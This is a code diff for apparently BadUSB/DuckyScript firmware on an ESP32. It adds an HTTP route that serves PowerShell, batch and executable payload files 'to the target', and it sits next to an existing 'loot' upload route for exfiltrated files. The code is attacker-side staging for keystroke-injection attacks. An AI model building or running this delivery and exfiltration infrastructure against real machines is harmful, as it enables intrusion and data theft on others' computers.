@@ -970,6 +970,61 @@ static void handle_api_upload(int sock, const char *body, int body_len) {
     }
 }
 
+// GET /payload/<filename>  – serve a file from /sdcard/payloads/ to the target
+// Used by DuckyScript payloads to deliver files via PowerShell iwr/WebClient
+#define PAYLOAD_SEND_BUF 512
+static void handle_payload_download(int sock, const char *filename)
+{
+    // Reject path traversal attempts
+    if (strchr(filename, '/') || strstr(filename, "..")) {
+        send_response(sock, "HTTP/1.1 400 Bad Request", "application/json", "{\"error\":\"Invalid filename\"}");
+        return;
+    }
+
+    char filepath[128];
+    snprintf(filepath, sizeof(filepath), "/sdcard/payloads/%s", filename);
+
+    FILE *f = fopen(filepath, "rb");
+    if (!f) {
+        ESP_LOGW(TAG, "Payload not found: %s", filepath);
+        send_response(sock, "HTTP/1.1 404 Not Found", "application/json", "{\"error\":\"Payload not found\"}");
+        return;
+    }
+
+    // Determine file size
+    fseek(f, 0, SEEK_END);
+    long file_size = ftell(f);
+    fseek(f, 0, SEEK_SET);
+
+    // Determine Content-Type by extension
+    const char *content_type = "application/octet-stream";
+    const char *ext = strrchr(filename, '.');
+    if (ext) {
+        if (strcmp(ext, ".ps1") == 0 || strcmp(ext, ".txt") == 0) content_type = "text/plain";
+        else if (strcmp(ext, ".bat") == 0 || strcmp(ext, ".cmd") == 0) content_type = "text/plain";
+        else if (strcmp(ext, ".exe") == 0) content_type = "application/octet-stream";
+    }
+
+    char header[256];
+    snprintf(header, sizeof(header),
+             "HTTP/1.1 200 OK\r\n"
+             "Content-Type: %s\r\n"
+             "Content-Length: %ld\r\n"
+             "Content-Disposition: attachment; filename=\"%s\"\r\n"
+             "Connection: close\r\n\r\n",
+             content_type, file_size, filename);
+    send_all(sock, header, strlen(header));
+
+    uint8_t buf[PAYLOAD_SEND_BUF];
+    size_t n;
+    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) {
+        if (send_all(sock, buf, (int)n) <= 0) break;
+    }
+
+    fclose(f);
+    ESP_LOGI(TAG, "Payload served: %s (%ld bytes)", filename, file_size);
+}
+
 // POST /loot/upload  – save exfiltrated file to /sdcard/loot/<filename>
 // Supports two modes:
 //   a) multipart/form-data  (same format as /api/upload)
@@ -1437,6 +1492,9 @@ static void handle_client(int sock) {
         } else {
             send_response(sock, "HTTP/1.1 400 Bad Request", "application/json", "{\"error\":\"No body\"}");
         }
+    }
+    else if (strncmp(path, "/payload/", 9) == 0 && strcmp(method, "GET") == 0) {
+        handle_payload_download(sock, path + 9);
     }
     else if (strcmp(path, "/api/update") == 0) {
         // TODO: Handle OTA update
